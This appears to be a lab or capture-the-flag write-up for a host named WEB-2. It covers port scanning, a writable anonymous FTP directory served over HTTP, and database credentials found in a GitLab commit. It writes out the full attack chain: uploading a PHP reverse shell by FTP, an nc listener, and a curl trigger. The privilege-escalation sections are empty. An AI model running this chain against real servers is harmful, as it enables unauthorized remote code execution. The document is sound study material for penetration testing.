---
description: 10.10.0.103
---

# WEB-2

## Information Gathering

Scanned all TCP ports:

```
PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0           10918 Jul 25  2021 index.html
|_drwxrwxrwx    2 0        0            4096 Jul 25  2021 temp [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.0.4
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 92:c6:96:e8:f6:71:ab:1c:f4:7e:1e:c8:a3:4b:3d:5f (RSA)
|   256 da:8d:4e:d1:cb:2b:b4:53:67:bf:30:1a:df:2e:66:d8 (ECDSA)
|_  256 6a:55:41:1f:85:29:9d:b7:26:3b:78:13:03:25:15:7e (ED25519)
80/tcp  open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
443/tcp open  ssl/http nginx
| http-robots.txt: 54 disallowed entries (15 shown)
| / /autocomplete/users /autocomplete/projects /search 
| /admin /profile /dashboard /users /help /s/ /-/profile /-/ide/ 
|_/*/new /*/edit /*/raw
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was https://10.10.0.103/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
| ssl-cert: Subject: commonName=10.10.0.103
| Not valid before: 2021-07-17T14:19:12
|_Not valid after:  2021-08-16T14:19:12
|_ssl-date: TLS randomness does not represent time
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Enumerated UDP ports:

```
No UDP ports are open
```

Notes:

* 21/FTP -- Anonymous login allowed -- need to enumerate
  * I immediately reailize that I have rwx permissions in the temp directory

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

* Can we write a file here
  * Made a file called test.txt
  * Attempted to put it in FTP -- it worked!

## Enumeration

### Port 80 - HTTP (Apache)

* Ran directory bruteforce
  * We have a file index on /temp
  * I was able to write a file to it and navigate to it via HTTP (test.txt)
  * Added a PHP reverse shell -- Success
* Ran vhosts -- nothing

### Port 443 - Nginx

{% embed url="https://10.10.0.103/brandon/website-dev/-/commit/9aa71e07f744323c6ebd1fbf568cbe7c234fc0e7" %}

* We see sa credentials for a data base

```
$connectionInfo = array( "Database"=>"gitlab", "UID"=>"sa", "PWD"=>"VeryVeryVerySecure1!");
```

```
sa

VeryVeryVerySecure1!
```

## Exploitation

### FTP Anonymous Access to RCE

This is the exploit I was able to take advantage of to write my PHP reverse shell to and execute via curl.

PHP Reverse Shell Code:

{% embed url="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php" %}

Access Anonymous FTP:

```
ftp 10.10.0.181 -a
put php-reverse-shell.php
exit
```

Begin netcat listener:

```
nc -lnvp 1337
```

Trigger the reverse shell:

```
curl http://10.10.0.103/temp/php-reverse-shell.php
```

* We are now <mark style="color:yellow;">www-data</mark>

## Privilege Escalation

### Local enumeration

### PrivEsc vector

## Proofs
